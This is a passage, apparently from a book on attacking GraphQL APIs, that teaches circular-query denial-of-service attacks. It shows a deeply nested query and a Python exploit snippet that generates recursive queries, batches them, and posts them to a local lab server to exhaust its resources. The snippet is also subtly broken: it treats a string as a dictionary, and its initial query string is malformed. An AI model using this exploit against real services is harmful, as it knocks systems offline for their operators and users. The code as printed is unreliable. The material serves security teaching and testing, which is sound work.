```
query {
  pastes {    # level 1
    owner {    # level 2
      pastes { # level 3
        owner { # level 4
          name  # level 5
        }
      }
    }
  }
}
```

Listing 5-14: A circular query

This recursive query has a depth level of five. On its own, it may not be enough to take down the target server, but we could modify it to make it much deeper. Each level creates an additional node that a server needs to process and resolve, consuming more server resources.

To experiment with circular queries, we’ve coded a custom exploit for your arsenal of hacking tools. This exploit can dynamically extend its circularity by letting you specify the number of circles that should be performed. The query is also capable of batching queries using arrays. The following code is a snippet from https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_circular_queries.py:

```
ARRAY_LENGTH = 5
FIELD_REPEAT = 10

query = '{"query":"query {"'
field_1_name = 'pastes'
field_2_name = 'owner'

count = 0
for _ in range(FIELD_REPEAT):
    count += 1
    closing_braces = '}' * FIELD_REPEAT * 2 + '}'
    payload = "{0} {{ {1} {{ ".format(field_1_name, field_2_name)
    query["query"] += payload

    if count == FIELD_REPEAT:
        query["query"] += '__typename' + closing_braces
--snip--
queries = []
for _ in range(ARRAY_LENGTH):
    queries.append(query)

r = requests.post('http://localhost:5013/graphql', json=queries)

print(r.json())
```

This code builds on the query in Listing 5-14 by dynamically generating a circular query and adding it to an array based on two main script inputs: ARRAY_LENGTH and FIELD_REPEAT. The ARRAY_LENGTH is the number of queries to